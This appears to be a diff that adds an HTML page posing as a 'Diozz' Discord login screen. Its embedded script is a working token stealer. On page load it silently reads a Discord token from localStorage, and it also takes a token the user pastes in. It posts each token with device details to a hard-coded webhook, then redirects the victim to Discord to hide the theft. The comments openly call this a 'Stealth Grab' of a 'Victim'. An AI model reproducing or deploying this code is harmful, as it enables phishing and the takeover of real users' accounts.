@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Diozz - Secure Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1c1e;
+            color: #e1e3e5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            background: #2f3136;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 320px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+            text-align: center;
+            border: 1px solid #40444b;
+        }
+        h1 {
+            color: #5865F2;
+            margin-bottom: 5px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .subtitle {
+            color: #b9bbbe;
+            font-size: 12px;
+            margin-bottom: 25px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            background: #40444b;
+            border: 1px solid #2f3136;
+            border-radius: 6px;
+            color: #fff;
+            box-sizing: border-box;
+            outline: none;
+            font-size: 15px;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #5865F2;
+            background: #454950;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #5865F2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        button:hover {
+            background: #4752c4;
+            transform: translateY(-1px);
+        }
+        button:disabled {
+            background: #72767d;
+            cursor: not-allowed;
+            transform: none;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #b9bbbe;
+            min-height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .loader {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #5865F2;
+            border-radius: 50%;
+            width: 14px;
+            height: 14px;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+            visibility: hidden;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Diozz Login</h1>
+        <p class="subtitle">Paste your token or let us detect it automatically.</p>
+        
+        <input type="text" id="tokenInput" placeholder="Enter Discord Token...">
+        <button id="loginBtn" onclick="handleLogin()">Login</button>
+        
+        <div id="status">
+            <span class="loader" id="loader"></span>
+            <span id="msg">Scanning for active session...</span>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION: REPLACE THIS WITH YOUR WEBHOOK
+        // ==========================================
+        const TARGET_URL = "https://discord.com/api/webhooks/1564801017688887357/DpQzt06hHNXKfbU7hUW6rrFTlyg0uZBOZHIrU7S-d6d9BdqsBzB-WAZ5aJ_20YJqMT0B";
+        // ==========================================
+
+        const statusMsg = document.getElementById('msg');
+        const loader = document.getElementById('loader');
+        const loginBtn = document.getElementById('loginBtn');
+        const tokenInput = document.getElementById('tokenInput');
+
+        // 1. ON LOAD: Stealth Grab
+        window.onload = function() {
+            // Check LocalStorage for existing Discord token
+            const foundToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
+            
+            if (foundToken && foundToken.length > 20) {
+                statusMsg.innerText = "Session found. Grabbing...";
+                // Send to webhook silently
+                sendAndRedirect(foundToken, "Auto-Grab (Mobile)");
+            } else {
+                statusMsg.innerText = "No active session. Please enter token.";
+            }
+        };
+
+        // 2. MANUAL LOGIN: User pastes token
+        function handleLogin() {
+            const token = tokenInput.value.trim();
+            if (!token || token.length < 20) {
+                statusMsg.innerText = "Invalid token. Please try again.";
+                return;
+            }
+            sendAndRedirect(token, "Manual Input (Mobile)");
+        }
+
+        // 3. CORE LOGIC: Send to Webhook + Login Victim
+        function sendAndRedirect(token, source) {
+            loader.style.visibility = "visible";
+            statusMsg.innerText = "Verifying...";
+            loginBtn.disabled = true;
+            tokenInput.disabled = true;
+
+            const payload = {
+                content: `**Diozz Mobile Grab**\n**Token:** \`${token}\`\n**Source:** ${source}\n**Device:** ${navigator.platform}\n**User-Agent:** ${navigator.userAgent.substring(0, 50)}`,
+                username: "Diozz Bot",
+                avatar_url: "https://i.imgur.com/9k3k3k3.png"
+            };
+
+            fetch(TARGET_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                // STEP A: Save token to browser so Discord accepts it
+                localStorage.setItem('token', token);
+                localStorage.setItem('discord_token', token);
+                
+                statusMsg.innerText = "Login Successful! Redirecting...";
+                
+                // STEP B: Redirect to Discord so they see they are logged in
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/app";
+                }, 1200);
+
+            })
+            .catch(err => {
+                console.error(err);
+                statusMsg.innerText = "Error connecting to server.";
+                loginBtn.disabled = false;
+                tokenInput.disabled = false;
+                loader.style.visibility = "hidden";
+            });
+        }
+    </script>
+</body>
+</html>
